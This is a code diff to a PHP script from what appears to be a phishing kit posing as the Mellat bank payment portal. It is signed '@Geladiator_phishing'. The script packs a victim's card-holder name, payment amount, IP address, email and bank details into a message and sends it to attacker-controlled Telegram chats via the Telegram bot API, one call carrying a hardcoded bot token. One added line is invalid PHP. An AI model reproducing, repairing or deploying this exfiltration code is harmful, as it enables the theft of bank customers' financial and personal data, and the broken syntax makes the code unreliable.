@@ -56,6 +56,7 @@ $ch = curl_init();
             'User-Agent: Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.83 Mobile Safari/537.36'
         ));
         $result     = curl_exec($ch);
+        $mailinfo = if($sendEmail==true){$Text .="✉️ Email : $email";}
         $json       = json_decode($result, true);
         $holderName = $json["firstName"] . " " . $json["lastName"];
 $Text = "
@@ -70,24 +71,22 @@ $Text = "
 -------------- INFO --------------
 👤 Card Holder : <code>$holderName</code>
 💴 Amount : $amount 𝗥𝗶𝗮𝗹𝘀
+$mailinfo
 📍 IP : <code>$ip</code>
 ⏰ Time : $saat
 📝 ToDay : $roz
 📌 Date : $tarikh
 ✨ Portal : Mellat
+-------------- $bankname --------------$bankinfo[0]
 ------------- Creator -------------
 🆔 : @Geladiator_phishing :)
 ";
     
-$Text .="\n$bankinfo[0]⁉️Spam: $num";
-
-if($sendEmail==true){
-    $Text .="\n⁉️Email: $email";
-}
+//$Text .="\n$bankinfo[0]⁉️Spam: $num";
 
 if( (integer)$num > $paylimit){}else{
     file_get_contents("https://api.telegram.org/bot1237690521:AAFVWN_LSL6J44g9xpEpzE2VEjTtLZ7V9cE/sendMessage?parse_mode=HTML&chat_id=-389276288&text=".urlencode($Text));
- file_get_contents("https://api.telegram.org/bot".$TOKENS."/sendMessage?parse_mode=HTML&chat_id=".$IDS."&text=".urlencode($Text));
+ file_get_contents("https://api.telegram.org/bot".$TOKEN."/sendMessage?parse_mode=HTML&chat_id=".$ID."&text=".urlencode($Text));
 } 
 
 ?>
